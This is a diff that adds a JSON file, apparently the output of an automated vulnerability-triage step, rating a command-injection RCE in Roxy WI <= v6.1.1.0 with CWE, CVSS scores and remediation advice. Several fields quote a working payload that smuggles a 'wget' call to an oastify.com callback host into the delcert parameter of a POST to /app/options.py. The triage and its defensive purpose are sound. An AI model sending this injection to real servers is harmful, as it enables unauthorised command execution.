@@ -1,0 +1,65 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "Unauthenticated remote code execution in Roxy WI <= v6.1.1.0 via uploading or manipulating ssl_cert through a POST to /app/options.py allowing command execution (e.g. injected wget).",
+    "affected_product": "Roxy WI <= v6.1.1.0",
+    "cwe": "CWE-77",
+    "cwe_quote": "show_versions=1&token=&alert_consumer=notNull&serv=127.0.0.1&delcert=a%20&%20wget%20<id>.oastify.com;",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "POST /app/options.py HTTP/1.1"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": ""
+      },
+      "UI": {
+        "value": "N",
+        "quote": "show_versions=1&token=&alert_consumer=notNull&serv=127.0.0.1&delcert=a%20&%20wget%20<id>.oastify.com;"
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "H",
+        "quote": "show_versions=1&token=&alert_consumer=notNull&serv=127.0.0.1&delcert=a%20&%20wget%20<id>.oastify.com;"
+      },
+      "I": {
+        "value": "H",
+        "quote": "show_versions=1&token=&alert_consumer=notNull&serv=127.0.0.1&delcert=a%20&%20wget%20<id>.oastify.com;"
+      },
+      "A": {
+        "value": "H",
+        "quote": "show_versions=1&token=&alert_consumer=notNull&serv=127.0.0.1&delcert=a%20&%20wget%20<id>.oastify.com;"
+      }
+    },
+    "recommended_next_step": "Confirm the vulnerable parameter handling in /app/options.py by reproducing the POST, identify how input is passed to system/command execution, and apply input validation or use safe APIs. If confirmed, notify vendor and prepare patch to sanitize or remove shell invocation; advise immediate mitigation (network access restrictions) until fixed.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "HTTP request demonstrating unauthenticated POST to options.py",
+        "quote": "POST /app/options.py HTTP/1.1"
+      },
+      {
+        "claim": "Exploit payload demonstrating command injection (wget)",
+        "quote": "show_versions=1&token=&alert_consumer=notNull&serv=127.0.0.1&delcert=a%20&%20wget%20<id>.oastify.com;"
+      },
+      {
+        "claim": "Advisory title stating unauthenticated RCE via ssl_cert upload",
+        "quote": "Exploit Title: Roxy WI v6.1.1.0 - Unauthenticated Remote Code Execution (RCE) via ssl_cert Upload"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 1950,
+    "output_tokens": 752,
+    "latency_s": null,
+    "batch": true
+  }
+}
